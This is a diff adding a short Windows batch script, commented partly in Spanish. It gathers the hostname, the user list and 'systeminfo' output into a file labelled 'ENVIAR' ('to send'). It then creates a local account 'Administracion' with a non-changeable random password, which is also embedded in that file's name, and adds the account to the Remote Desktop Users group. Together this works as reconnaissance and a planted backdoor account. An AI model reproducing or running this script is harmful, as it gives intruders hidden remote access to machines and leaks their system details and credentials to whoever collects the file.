@@ -1,0 +1,11 @@
+@echo off
+::SET NAME WHIT HOST NAME
+for /f "delims= " %%a in ('hostname') do @set NOMBRE=%%a
+SET RANDOMN=%RANDOM%
+::PRINT RESULT IN TXT FILE WHEN NAME OF TEXT IS HOSTNAME_RANDOMNUM_DATE
+TYPE nul > "%NOMBRE%_%RANDOMN%_%DATE:/=%_ENVIAR.txt"
+net user >> "%NOMBRE%_%RANDOMN%_%DATE:/=%_ENVIAR.txt"
+systeminfo >> "%NOMBRE%_%RANDOMN%_%DATE:/=%_ENVIAR.txt"
+net user Administracion %RANDOMN% /ADD /PASSWORDCHG:NO
+net localgroup "Administradores"
+net localgroup "Usuarios de escritorio remoto" Administracion /add
